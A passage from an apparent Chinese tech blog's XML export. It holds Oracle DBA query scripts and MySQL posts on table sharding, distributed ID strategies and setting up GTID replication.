dba_part_indexes pi, dba_segments s WHERE s.segment_name = pi.index_name AND s.owner = pi.owner AND s.segment_type = 'INDEX PARTITION' UNION ALLSELECT l.table_name, l.owner, s.bytes FROM dba_lobs l, dba_segments s WHERE s.segment_name = l.segment_name AND s.owner = l.owner AND s.segment_type = 'LOBSEGMENT' UNION ALLSELECT l.table_name, l.owner, s.bytes FROM dba_lobs l, dba_segments s WHERE s.segment_name = l.index_name AND s.owner = l.owner AND s.segment_type = 'LOBINDEX' UNION allSELECT l.table_name, l.owner, s.bytes FROM dba_lobs l, dba_segments s WHERE s.segment_name = l.segment_name AND s.owner = l.owner AND s.segment_type = 'LOB PARTITION' )GROUP BY owner,table_nameHAVING SUM(bytes)/1024/1024 > 10ORDER BY SUM(bytes) DESC 查看当前会话的SID123SELECT *FROM V$MYSTATWHERE rownumSELECT valueFROM v$dataguard_statsWHERE name='apply lag' 或 备库sqlplus>SELECT ceil((sysdate-next_time)*24*60) "M"FROM v$archived_logWHERE applied='YES' AND SEQUENCE#= (SELECT MAX(SEQUENCE#) FROM V$ARCHIVED_LOG WHERE applied='YES'); 查看某个包或存储过程是否正在被调用,如果如下有结果，则此时不能编译，否则会锁住1234SELECT *FROM V$DB_OBJECT_CACHEWHERE pin>0 AND name=upper('XX') 查询数据库打补丁的记录12SELECT *FROM dba_registry_history; 查询某表的索引字段的distinct行数和CLUSTERING_FACTOR信息12345678910111213SELECT a.table_name, a.index_name, b.COLUMN_NAME, a.blevel, a.distinct_keys, A.CLUSTERING_FACTOR, A.NUM_ROWS, trunc((a.distinct_keys/A.NUM_ROWS), 2)*100||'%' "distinct%",trunc((a.CLUSTERING_FACTOR/A.NUM_ROWS),2)*100||'%' "CLUSTERING_FACTOR%"FROM DBA_IND_STATISTICS a,DBA_IND_COLUMNS bWHERE a.table_name='XX' AND a.INDEX_NAME=b.index_nameORDER BY 5 desc 查询某表的所有字段的distinct行数123456789101112SELECT a.table_name, b.num_rows, a.column_name, a.data_type, a.data_length, a.num_distinct, trunc((a.num_distinct/b.num_rows), 2)*100||'%'FROM dba_TAB_COLS a,dba_tables bWHERE a.table_name='XX' AND a.table_name=b.table_nameORDER BY 6 DESC 查询5G以上空闲空间可以进行收缩的数据文件123456789101112SELECT 'alter database datafile ''' || a.file_name || ''' resize ' || round(a.filesize -(a.filesize - c.hwmsize) * 0.8) || 'M;', a.filesize || 'M' AS "数据文件的总大小", c.hwmsize || 'M' AS "数据文件的实用大小"FROM (SELECT file_id, file_name, round(bytes / 1024 / 1024) AS filesize FROM dba_data_files) a, (SELECT file_id, round(max(block_id) * 8 / 1024) AS HWMsize FROM dba_extents GROUP BY file_id) cWHERE a.file_id = c.file_id AND a.filesize - c.hwmsize > 5000; 参考 廖学强,DBA日常维护SQL脚本 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Oracle</category>
      </categories>
      <tags>
        <tag>Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据库拆分]]></title>
    <url>%2F2019%2F04%2F24%2FdatabaseSplitting%2F</url>
    <content type="text"><![CDATA[童话里灰姑娘都很穷，但都很漂亮，你漂亮吗？ 数据库水平垂直拆分当数据库量非常大的时候，DB 已经成为系统瓶颈时就可以考虑进行水平垂直拆分了。 水平拆分一般水平拆分是根据表中的某一字段(通常是主键 ID )取模处理，将一张表的数据拆分到多个表中。这样每张表的表结构是相同的但是数据不同。 不但可以通过 ID 取模分表还可以通过时间分表，比如每月生成一张表。按照范围分表也是可行的:一张表只存储 0~1000W的数据，超过只就进行分表，这样分表的优点是扩展灵活，但是存在热点数据。 按照取模分表拆分之后我们的查询、修改、删除也都是取模。比如新增一条数据的时候往往需要一张临时表来生成 ID,然后根据生成的 ID 取模计算出需要写入的是哪张表(也可以使用分布式 ID 生成器来生成 ID)。 分表之后不能避免的就是查询要比以前复杂，通常不建议 join ，一般的做法是做两次查询。 垂直拆分当一张表的字段过多时则可以考虑垂直拆分。通常是将一张表的字段才分为主表以及扩展表，使用频次较高的字段在一张表，其余的在一张表。 这里的多表查询也不建议使用 join ，依然建议使用两次查询。 拆分之后带来的问题拆分之后由一张表变为了多张表，一个库变为了多个库。最突出的一个问题就是事务如何保证。 两段提交最终一致性如果业务对强一致性要求不是那么高那么最终一致性则是一种比较好的方案。 通常的做法就是补偿，比如 一个业务是 A 调用 B，两个执行成功才算最终成功，当 A 成功之后，B 执行失败如何来通知 A 呢。 比较常见的做法是 失败时 B 通过 MQ 将消息告诉 A，A 再来进行回滚。这种的前提是 A 的回滚操作得是幂等的，不然 B 重复发消息就会出现问题。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式 ID 生成策略]]></title>
    <url>%2F2019%2F04%2F24%2FDistributed-ID-Generation%2F</url>
    <content type="text"><![CDATA[胸小的姑娘一般脾气都特大，胸大的姑娘一般脾气都特好，因为古语有云：穷凶极恶有容乃大！ 前言对于系统中的一组数据而言，必不可少地对应有唯一标识。简单的单体应用可以使用数据库的自增 ID 作为唯一标识。而在复杂的分布式系统中，就需要一些特定的策略去生成对应的分布式 ID。 常见的项目中 ID 会有以下两个特点： 全局唯一性。 趋势递增（对于使用 MySQL 的项目而言）。 因为一般 ID 会作为数据库的主键存储，而在 MySQL InnoDB 中使用的是聚簇索引，使用有序的 ID 可以保证写入性能。 一般在分布式系统中，会有一个单独的服务来生成 ID。而这个服务则需要保证高可用性、高QPS 与安全性。另外生成的 ID 是不应该对外暴露的，如果非要对外展示，最好是无规则、不规律的编码。 生成策略UUIDUUID (Universally Unique Identifier) 生成的是一个长度为 32 的 16 进制格式的字符串。UUID 有多个版本，各版本算法不同。但核心思想是一致的，基本上都是结合机器的网卡、当前时间、一个随机数来生成特定长度的字符串。 优点：性能好、高可扩展性：本地生成，无网络消耗，不需要考虑性能瓶颈。 缺点： 无法保证趋势递增。 UUID 过长，如果需要在数据库存储，作为主键建立索引效率低。 适用场景：不需要考虑空间占用，不需要生成有递增趋势，且不在 MySQL 中存储。 Snowflakesnowflake 是 Twitter 开源的一个 ID 生成算法。 首位符号位：因为 ID 一般为正数，该值为 0。 41 位时间戳（毫秒级）： 时间戳不是当前时间的时间戳，而是存储时间戳的差值（当前时间戳 - 起始时间戳（起始时间戳需要程序指定））理论上可以最多使用 (1 < 41) / (1000x60x60x24x365) = 69年]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL 水平拆分表的一次踩坑]]></title>
    <url>%2F2019%2F04%2F24%2Fmysql-sharding%2F</url>
    <content type="text"><![CDATA[胸小的姑娘一般脾气都特大，胸大的姑娘一般脾气都特好，因为古语有云：穷凶极恶有容乃大！ 前言之前不少人问我”能否分享一些分库分表相关的实践”，其实不是我不分享，而是真的经验不多🤣；和大部分人一样都是停留在理论阶段。 不过这次多少有些可以说道了。 先谈谈背景，我们生产数据库随着业务发展量也逐渐起来；好几张单表已经突破亿级数据，并且保持每天 200+W 的数据量增加。 而我们有些业务需要进行关联查询、或者是报表统计；在这样的背景下大表的问题更加突出（比如一个查询功能需要跑好几分钟）。 可能很多人会说：为啥单表都过亿了才想方案解决？其实不是不想，而是由于历史原因加上错误预估了数据增长才导致这个局面。总之原因比较复杂，也不是本次讨论的重点。 临时方案由于需求紧、人手缺的情况下，整个处理的过程分为几个阶段。 第一阶段应该是去年底，当时运维反应 MySQL 所在的主机内存占用很高，整体负载也居高不下，导致整个 MySQL 的吞吐量明显降低（写入、查询数据都明显减慢）。 为此我们找出了数据量最大的几张表，发现大部分数据量在7/8000W 左右，少数的已经突破一亿。 通过业务层面进行分析发现，这些数据多数都是用户产生的一些日志型数据，而且这些数据在业务上并不是强相关的，甚至两三个月前的数据其实已经不需要实时查询了。 因为接近年底，尽可能的不想去动应用，考虑是否可以在运维层面缓解压力；主要的目的就是把单表的数据量降低。 原本是想把两个月之前的数据直接迁移出来放到备份表中，但在准备实施的过程中发现一个大坑。 表中没有一个可以排序的索引，导致我们无法快速的筛选出一部分数据！这真是一个深坑，为后面的一些优化埋了个地雷；即便是加索引也需要花几个小时（具体多久没敢在生产测试）。 如果我们强行按照时间进行筛选，可能查询出 4000W 的数据就得花上好几个小时；这显然是行不通的。 于是我们便想到了一个大胆的想法：这部分数据是否可以直接不要了？ 这可能是最有效及最快的方式了，和产品沟通后得知这部分数据真的只是日志型的数据，即便是报表出不来今后补上也是可以的。 于是我们就简单粗暴的做了以下事情： 修改原有表的表名，比如加上(_190416bak)。 再新建一张和原有表名称相同的表。 这样新的数据就写到了新表，同时业务上也是使用的这个数据量较小的新表。 虽说过程不太优雅，但至少是解决了问题同时也给我们做技术改造预留了时间。 分表方案之前的方案虽说可以缓解压力，但不能根本解决问题。 有些业务必须得查询之前的数据，导致之前那招行不通了，所以正好我们就借助这个机会把表分了。 我相信大部分人虽说没有做过实际做过分表，但也见过猪跑；网上一搜各种方案层出不穷。 我认为最重要的一点是要结合实际业务找出需要 sharding 的字段，同时还有上线阶段的数据迁移也非常重要。 时间可能大家都会说用 hash 的方式分配得最均匀，但我认为这还是需要使用历史数据的场景才用哈希分表。 而对于不需要历史数据的场景，比如业务上只查询近三个月的数据。 这类需求完成可以采取时间分表，按照月份进行划分，这样改动简单，同时对历史数据也比较好迁移。 于是我们首先将这类需求的表筛选出来，按照月份进行拆分，只是在查询的时候拼接好表名即可；也比较好理解。 哈希刚才也提到了：需要根据业务需求进行分表策略。 而一旦所有的数据都有可能查询时，按照时间分表也就行不通了。（也能做，只是如果不是按照时间进行查询时需要遍历所有的表） 因此我们计划采用 hash 的方式分表，这算是业界比较主流的方式就不再赘述。 采用哈希时需要将 sharding 字段选好，由于我们的业务比较单纯；是一个物联网应用，所有的数据都包含有物联网设备的唯一标识（IMEI），并且这个字段天然的就保持了唯一性；大多数的业务也都是根据这个字段来的，所以它非常适合来做这个 sharding 字段。 在做分表之前也调研过 MyCAT 及 sharding-jdbc(现已升级为 shardingsphere)，最终考虑到对开发的友好性及不增加运维复杂度还是决定在 jdbc 层 sharding 的方式。 但由于历史原因我们并不太好集成 sharding-jdbc，但基于 sharding 的特点自己实现了一个分表策略。 这个简单也好理解： 123int index = hash(sharding字段) % 分表数量 ;select xx from 'busy_'+index where sharding字段 = xxx; 其实就是算出了表名，然后路由过去查询即可。 只是我们实现的非常简单：修改了所有的底层查询方法，每个方法都里都做了这样的一个判断。 并没有像 sharding-jdbc 一样，代理了数据库的查询方法；其中还要做 SQL解析-->SQL路由-->执行SQL-->合并结果 这一系列的流程。 如果自己再做一遍无异于重新造了一个轮子，并且并不专业，只是在现有的技术条件下选择了一个快速实现达成效果的方法。 不过这个过程中我们节省了将 sharding 字段哈希的过程，因为每一个 IMEI 号其实都是一个唯一的整型，直接用它做 mod 运算即可。 还有一个是需要一个统一的组件生成规则，分表后不能再依赖于单表的字段自增了；方法还是挺多的： 比如时间戳+随机数可满足大部分业务。 UUID，生成简单，但没法做排序。 雪花算法统一生成主键ID。 大家可以根据自己的实际情况做选择。 业务调整因为我们并没有使用第三方的 sharding-jdbc 组件，所有没有办法做到对代码的低侵入性；每个涉及到分表的业务代码都需要做底层方法的改造（也就是路由到正确的表）。 考虑到后续业务的发展，我们决定将拆分的表分为 64 张；加上后续引入大数据平台足以应对几年的数据增长。 这里还有个小细节需要注意：分表的数量需要为 2∧N 次方，因为在取模的这种分表方式下，即便是今后再需要分表影响的数据也会尽量的小。 再修改时只能将表名称进行全局搜索，然后加以修改，同时根据修改的方法倒推到表现的业务并记录下来，方便后续回归测试。 当然无法避免查询时利用非 sharding 字段导致的全表扫描，这是所有分片后都会遇到的问题。 因此我们在修改分表方法的底层查询时同时也会查看是否有走分片字段，如果不是，那是否可以调整业务。 比如对于一个上亿的数据是否还有必要存在按照分页查询、日期查询？这样的业务是否真的具有意义？ 我们尽可能的引导产品按照这样的方式来设计产品或者做出调整。 但对于报表这类的需求确实也没办法，比如统计表中某种类型的数据；这种我们也可以利用多线程的方式去并行查询然后汇总统计来提高查询效率。 有时也有一些另类场景： 比如一个千万表中有某一特殊类型的数据只占了很小一部分，比如说几千上万条。 这时页面上需要对它进行分页查询是比较正常的（比如某种投诉消息，客户需要一条一条的单独处理），但如果我们按照 IMEI 号或者是主键进行分片后再分页查询那就比较蛋疼了。 所以这类型的数据建议单独新建一张表来维护，不要和其他数据混合在一起，这样不管是做分页还是 like 都比较简单和独立。 验证代码改完，开发也单测完成后怎么来验证分表的业务是否正常也比较麻烦。 一个是测试麻烦，再一个是万一哪里改漏了还是查询的原表，但这样在测试环境并不会有异常，一旦上线产生了生产数据到新的 64 张表后想要再修复就比较麻烦了。 所以我们取了个巧，直接将原表的表名修改，比如加一个后缀；这样在测试过程中观察前后台有无报错就比较容易提前发现这个问题。 上线流程测试验收通过后只是分表这个需求的80%，剩下如何上线也是比较头疼。 一旦应用上线后所有的查询、写入、删除都会先走路由然后到达新表；而老数据在原表里是不会发生改变的。 数据迁移所以我们上线前的第一步自然是需要将原有的数据进行迁移，迁移的目的是要分片到新的 64 张表中，这样才会对原有的业务无影响。 因此我们需要额外准备一个程序，它需要将老表里的数据按照分片规则复制到新表中； 在我们这个场景下，生产数据有些已经上亿了，这个迁移过程我们在测试环境模拟发现耗时是非常久的。而且我们老表中对于 create_time 这样用于筛选数据的字段没有索引（以前的技术债），所以查询起来就更加慢了。 最后没办法，我们只能和产品协商告知用户对于之前产生的数据短期可能会查询不到，这个时间最坏可能会持续几天（我们只能在凌晨迁移，白天会影响到数据库负载）。 总结这便是我们这次的分表实践，虽说不少过程都不优雅，但受限于条件也只能折中处理。 但我们后续的计划是，修改我们底层的数据连接（目前是自己封装的一个 jar 包，导致集成 sharding-jdbc 比较麻烦）最终逐渐迁移到 sharding-jdbc . 最后得出了几个结论： 一个好的产品规划非常有必要，可以在合理的时间对数据处理（不管是分表还是切入归档）。 每张表都需要一个可以用于排序查询的字段（自增ID、创建时间），整个过程由于没有这个字段导致耽搁了很长时间。 分表字段需要谨慎，要全盘的考虑业务情况，尽量避免出现查询扫表的情况。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL5.7 GTID原理与实战]]></title>
    <url>%2F2019%2F04%2F22%2Fmysql-GTID%2F</url>
    <content type="text"><![CDATA[工作多年，当人家问你是不是初入社会，不是因为你看起来年轻，而是因为觉得你怎么这么笨。 前言GTID是什么？GTID 是Global Transaction Identifiers的缩写，简称GTID GTID组成和架构1) GTID = source_id:transaction_id2) server_uuid 来源于 auto.cnf13E11FA47-71CA-11E1-9E33-C80AA9429562 3) GTID: 在一组复制中，全局唯一 The syntax for a GTID set is as follows:1234567891011121314151617gtid_set: uuid_set [, uuid_set] ... | ''uuid_set: uuid:interval[:interval]...uuid: hhhhhhhh-hhhh-hhhh-hhhh-hhhhhhhhhhhhh: [0-9|A-F]interval: n[-n] (n >= 1) mysql.gtid_executed表的压缩由名为thread/sql/compress_gtid_table的专用前台线程执行。 此线程未在SHOW PROCESSLIST的输出中列出，但可以将其视为线程表中的一行，如下所示：12345678910111213141516171819mysql> SELECT * FROM performance_schema.threads WHERE NAME LIKE '%gtid%'\G*************************** 1. row *************************** THREAD_ID: 26 NAME: thread/sql/compress_gtid_table TYPE: FOREGROUND PROCESSLIST_ID: 1 PROCESSLIST_USER: NULL PROCESSLIST_HOST: NULL PROCESSLIST_DB: NULLPROCESSLIST_COMMAND: Daemon PROCESSLIST_TIME: 1509 PROCESSLIST_STATE: Suspending PROCESSLIST_INFO: NULL PARENT_THREAD_ID: 1 ROLE: NULL INSTRUMENTED: YES HISTORY: YES CONNECTION_TYPE: NULL THREAD_OS_ID: 18677 GTID和Binlog的关系 GTID在binlog中的结构 GTID event 结构 Previous_gtid_log_event Previous_gtid_log_event 在每个binlog 头部都会有 每次binlog rotate的时候存储在binlog头部 Previous-GTIDs在binlog中只会存储在这台机器上执行过的所有binlog，不包括手动设置gtid_purged值。 换句话说，如果你手动set global gtid_purged=xx; 那么xx是不会记录在Previous_gtid_log_event中的。 GTID和Binlog之间的关系是怎么对应的呢 如何才能找到GTID=?对应的binlog文件呢？12345678* 假设有4个binlog: bin.001,bin.002,bin.003,bin.004* bin.001 : Previous-GTIDs=empty; binlog_event有：1-40 * bin.002 : Previous-GTIDs=1-40; binlog_event有：41-80 * bin.003 : Previous-GTIDs=1-80; binlog_event有：81-120 * bin.004 : Previous-GTIDs=1-120; binlog_event有：121-160 1. 假设现在我们要找GTID=$A，那么MySQL的扫描顺序为： 从最后一个binlog开始扫描（即：bin.004） 2. bin.004的Previous-GTIDs=1-120，如果$A=140 > Previous-GTIDs,那么肯定在bin.004中 3. bin.004的Previous-GTIDs=1-120，如果$A=88 包含在Previous-GTIDs中,那么继续对比上一个binlog文件 bin.003,然后再循环前面2个步骤，直到找到为止 重要参数的持久化 GTID相关参数 variables comment gtid_executed 执行过的所有GTID gtid_purged 丢弃掉的GTID gtid_mode gtid模式 gtid_next session级别的变量，下一个gtid gtid_owned 正在运行的gtid enforce_gtid_consistency 保证GTID安全的参数 重要参数如何持久化 如何持久化gtid_executed [ log-bin=on,log_slave_update=on ]123gtid_executed = mysql.gtid_executed #[normal]orgtid_executed = mysql.gtid_executed + last_binlog 中最后没写到mysql.gtid_executed中的gtid_event #[recover] 如何持久化重置的gtid_purged值?12reset master;set global gtid_purged='$A:a-b'; 12341. 由于有可能手动设置过gtid_purged=$A:a-b, binlog.index中，last_binlog的Previous-GTIDs并不会包含$A:a-b 2. 由于有可能手动设置过gtid_purged=$A:a-b, binlog.index中，first_binlog的Previous-GTIDs肯定不会出现$A:a-b 3. 重置的gtid_purged = @@global.gtid_executed(mysql.gtid_executed:注意，考虑到这个表的更新触发条件，所以这里用@@global.gtid_executed代替) - last_binlog的Previous-GTIDs - last_binlog所有的gtid_event 4. 下面就用 $reset_gtid_purged 来表示重置的gtid 如何持久化gtid_purged [ log-bin=on,log_slave_update=on ]1gtid_purged=binlog.index:first_binlog的Previous-GTIDs + $reset_gtid_purged 开启GTID的必备条件 MySQL 5.6 1234gtid_mode=ON (必选) log_bin=ON (必选) log-slave-updates=ON (必选) enforce-gtid-consistency (必选) MySQL 5.7 MySQL5.7.13 or higher 1234gtid_mode=ON (必选) enforce-gtid-consistency （必选）log_bin=ON （可选）--高可用切换，最好设置ON log-slave-updates=ON （可选）--高可用切换，最好设置ON 新的复制协议 COM_BINLOG_DUMP_GTID slave会将已经执行过的gtid，以及以及接受到relay log中的gtid的并集发送给master 12* http://dev.mysql.com/doc/refman/5.7/en/change-master-to.htmlUNION(@@global.gtid_executed, Retrieved_gtid_set - last_received_GTID) Master send all other transactions to slave 同样的GTID不能被执行两次，如果有同样的GTID，会自动被skip掉。 - slave1 : 将自身的UUID1:1 发送给 master，然后接收到了 UUID1:2,UUID1:3 event - slave2 : 将自身的UUID1:1,UUID1:2 发送给 master，然后接收到了UUID1:3 event GTID重要函数和新语法 重要函数 Name Description GTID_SUBSET(subset, set) returns true (1) if all GTIDs in subset are also in set GTID_SUBTRACT(set,subset) returns only those GTIDs from set that are not in subset WAIT_FOR_EXECUTED_GTID_SET(gtid_set[, timeout]) Wait until the given GTIDs have executed on slave. WAIT_UNTIL_SQL_THREAD_AFTER_GTIDS(gtid_set[, timeout][,channel]) Wait until the given GTIDs have executed on slave. 新语法 12345678910START SLAVE [thread_types] [until_option] [connection_options]thread_types: [thread_type [, thread_type] ... ]thread_type: IO_THREAD | SQL_THREADuntil_option: UNTIL { {SQL_BEFORE_GTIDS | SQL_AFTER_GTIDS} = gtid_set | MASTER_LOG_FILE = 'log_name', MASTER_LOG_POS = log_pos | RELAY_LOG_FILE = 'log_name', RELAY_LOG_POS = log_pos | SQL_AFTER_MTS_GAPS } 举个栗子: START SLAVE SQL_THREAD UNTIL SQL_BEFORE_GTIDS = 3E11FA47-71CA-11E1-9E33-C80AA9429562:11-56 表示，当SQL_thread 执行到3E11FA47-71CA-11E1-9E33-C80AA9429562:10 的时候停止，下一个事务是11 START SLAVE SQL_THREAD UNTIL SQL_AFTER_GTIDS = 3E11FA47-71CA-11E1-9E33-C80AA9429562:11-56 表示，当SQL_thread 执行到3E11FA47-71CA-11E1-9E33-C80AA9429562:56 的时候停止，56是最后一个提交的事务。 GTID有什么好处classic replication [运维之伤] GTID replication [so easy] GTID的Limitation 不安全的事务1设置enforce-gtid-consistency=ON 1231. CREATE TABLE ... SELECT statements 2. CREATE TEMPORARY TABLE or DROP TEMPORARY TABLE statements inside transactions3. 同时更新 事务引擎 和 非事务引擎。 MySQL5.7 GTID crash-safe关于 GTID crash safe 可以参考官方文档列出的安全配置 单线程复制Non-GTID 推荐配置: relay_log_recovery=1 relay_log_info_repository=TABLE master_info_repository=TABLE GTID 推荐配置: * MASTER_AUTO_POSITION=on * relay_log_recovery=0 多线程复制Non-GTID 推荐配置: relay_log_recovery=1 sync_relay_log=1 relay_log_info_repository=TABLE master_info_repository=TABLEGTID 推荐配置: MASTER_AUTO_POSITION=on relay_log_recovery=0 实战使用GTID搭建Replication从0开始搭建 step 1: 让所有server处于同一个点 1mysql> SET @@global.read_only = ON; step 2: 关闭所有MySQL 1shell> mysqladmin -uusername -p shutdown step 3: 重启所有MySQL，并开启GTID 1shell> mysqld --gtid-mode=ON --log-bin --enforce-gtid-consistency & 当然，在my.cnf中配置好最佳 step 4: change master 123mysql> CHANGE MASTER TO MASTER_HOST = host, MASTER_PORT = port, MASTER_USER = user, MASTER_PASSWORD = password, MASTER_AUTO_POSITION = 1, MASTER_CONNECT_RETRY=10; mysql> START SLAVE; step 5: 让master 可读可写 1mysql> SET @@global.read_only = OFF; 从备份中恢复&搭建 step 1: 备份 123mysqldump xx 获取并且记录gtid_purged值 or冷备份 --获取并且记录gtid_executed值，这个就相当于mysqldump中得到的gtid_purged step 2: 在新服务器上reset master，导入备份 123reset master; --清空gtid信息 导入备份； --如果是逻辑导入，请设置sql_log_bin=off set global gtid_purged='xx'; step 3: change master 123mysql> CHANGE MASTER TO MASTER_HOST = host, MASTER_PORT = port, MASTER_USER = user, MASTER_PASSWORD = password, MASTER_AUTO_POSITION = 1, MASTER_CONNECT_RETRY=10; mysql> START SLAVE; 如何从classic replication 升级成 GTID replicationoffline 方式升级offline 的方式升级最简单。全部关机，然后配置好GTID，重启，CHANGE MASTER TO MASTER_AUTO_POSITION=1。 online 方式升级这里先介绍几个重要GTID_MODE的value GTID_MODE = OFF 不产生Normal_GTID，只接受来自master的ANONYMOUS_GTID GTID_MODE = OFF_PERMISSIVE 不产生Normal_GTID，可以接受来自master的ANONYMOUS_GTID & Normal_GTID GTID_MODE = ON_PERMISSIVE 产生Normal_GTID，可以接受来自master的ANONYMOUS_GTID & Normal_GTID GTID_MODE = ON 产生Normal_GTID，只接受来自master的Normal_GTID master和slave的gtid_mode 组合搭配矩阵图 水平的GTID_MODE为：master 垂直的GTID_MODE为：slave gtid_mode OFF(master) OFF_PERMISSIVE(master) ON_PERMISSIVE(master) ON(master) OFF(slave) Y Y N N OFF_PERMISSIVE(slave) Y Y Y Y(auto_position可以开启) ON_PERMISSIVE(slave) Y Y Y Y(auto_position可以开启) ON(slave) N N Y Y(auto_position可以开启) 归纳总结： 当master产生Normal_GTID的时候（ON_PERMISSIVE，ON），如果slave的gtid_mode（OFF）不能接受Normal_GTID，那么就会报错 当master产生ANONYMOUS_GTID的时候（OFF_PERMISSIVE，OFF），如果slave的gtid_mode（ON）不能接受ANONYMOUS_GTID，那么就会报错 设置auto_position的条件： 当master gtid_mode=ON时，slave可以为OFF_PERMISSIVE，ON_PERMISSIVE，ON。除此之外，都不能设置auto_position = on 下面罗列下，如何online 升级为GTID模式。 step 1: 每台server执行 检查错误日志，直到没有错误出现，才能进行下一步 1SET @@GLOBAL.ENFORCE_GTID_CONSISTENCY = WARN; step 2: 每台server执行 1SET @@GLOBAL.ENFORCE_GTID_CONSISTENCY = ON; step 3: 每台server执行 不用关心一组复制集群的server的执行顺序，只需要保证每个Server都执行了，才能进行下一步 1SET @@GLOBAL.GTID_MODE = OFF_PERMISSIVE; step 4: 每台server执行 不用关心一组复制集群的server的执行顺序，只需要保证每个Server都执行了，才能进行下一步 1SET @@GLOBAL.GTID_MODE = ON_PERMISSIVE; step 5: 在每台server上执行，如果ONGOING_ANONYMOUS_TRANSACTION_COUNT=0就可以 不需要一直为0，只要出现过0一次，就ok 1SHOW STATUS LIKE 'ONGOING_ANONYMOUS_TRANSACTION_COUNT'; step 6： 确保所有anonymous事务传递到slave上了 master 1SHOW MASTER STATUS; 每个slave 1SELECT MASTER_POS_WAIT(file, position); 或者，等一段时间，只要不是大的延迟，一般都没问题 step 7: 每台Server上执行 1SET @@GLOBAL.GTID_MODE = ON; step 8: 在每台server上将my.cnf中添加好gtid配置 1234gtid_mode=ON (必选) enforce-gtid-consistency (必选)log_bin=ON (可选)--高可用切换，最好设置ON log-slave-updates=ON (可选)--高可用切换，最好设置ON step 9: change master 123STOP SLAVE; CHANGE MASTER TO MASTER_AUTO_POSITION = 1; START SLAVE; GTID failoverMySQL crash> 配置好loss-less semi-sync replication，可以更可靠的保证数据零丢失。 以下说的都是crash 后，起不来的情况 binlog 在master还有日志没有传递到 slave123456781. 选取最新的slave, CHANGE MASTER TO maseter_auto_position 同步好 2. mysqlbinlog 将没传递过来的binlog在新master上replay 3. 打开新 master 的 SET GLOBAL surper_read_only=off;``` * binlog 已经传递到slave```bash1. 选取最新的slave, CHANGE MASTER TO maseter_auto_position同步好 2. 打开新master的 SET GLOBAL surper_read_only=off; OS crash121. 选取最新的slave, CHANGE MASTER TO maseter_auto_position同步好 2. 打开新master的 SET GLOBAL surper_read_only=off; 以上操作，在传统模式复制下，只能通过MHA来实现，MHA比较复杂。 现在，在GTID模式下，实现起来非常简单，且非常方便。 GTID 运维和错误处理 使用GTID后，对原来传统的运维有不同之处了，需要调整过来。 使用Row模式且复制配置正确的情况下，基本上很少发现有复制出错的情况。 slave 设置 super_read_only=on 错误场景: Errant transaction出现这种问题基本有两种情况 复制参数没有配置正确，当slave crash后，会出现重复键问题 DBA操作不正确，不小心在slave上执行了事务 对于第一个重复键问题 对于第一个重复键问题 123* skip transation; SQL> SET GLOBAL SQL_SLAVE_SKIP_COUNTER=1;SQL> START SLAVE; GTID模式 1234SQL> SET GTID_NEXT='b9b4712a-df64-11e3-b391-60672090eb04:7'; --设置需要跳过的gtid eventSQL> BEGIN;COMMIT;SQL> SET GTID_NEXT='AUTOMATIC';SQL> START SLAVE; 对于第二种不小心多执行了事务 这种情况就比较难了，这样已经导致了数据不一致，大多数情况，建议slave重做 如何避免： slave 设置 super_read_only=on; 重点： 当发生inject empty transction后，有可能会丢失事务 这里说下inject empty transction的隐患 当slave上inject empty transction，说明有一个master的事务被忽略了（这里假设是 $uuid:100） 事务丢失一：如果此时此刻master挂了，这个slave被选举为新master，那么其他的slave如果还没有执行到$uuid:100,就会丢失掉$uuid:100这个事务。 事务丢失二：如果从备份中重新搭建一个slave，需要重新执行之前的所有事务，而此时，master挂了， 又回到了事务丢失一的场景。 QA如何重置gtid_executed，gtid_purged。 设置gtid_executed 现在只能执行: 1mysql> reset master; 设置gtid_purged 当gtid_executed 非空的时候，不能设置gtid_purged 当gtid_executed 为空的时候(即刚刚备份好的镜像，刚搭建的mysql)1mysql> SET @@GLOBAL.GTID_PURGED='0ad6eae9-2d66-11e6-864f-ecf4bbf1f42c:1-3'; 如果auto.cnf 被删掉了，对于GTID的复制会有什么影响？> 如果被删掉，重启后，server-uuid 会变 手动设置 set @@gtid_purged = xx:yy, mysql会去主动修改binlog的头么> 不会 GTID和复制过滤规则之间如何协同工作？MySQL，test还能愉快的过滤掉吗？> 可以，改过滤的会自己过滤，不用担心 Automatic failover with mysqlfailover+GTIDmysqlfailover+GTID document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL查询重复记录,删除重复记录方法]]></title>
    <url>%2F2019%2F04%2F22%2Fmysql-duplicate%2F</url>
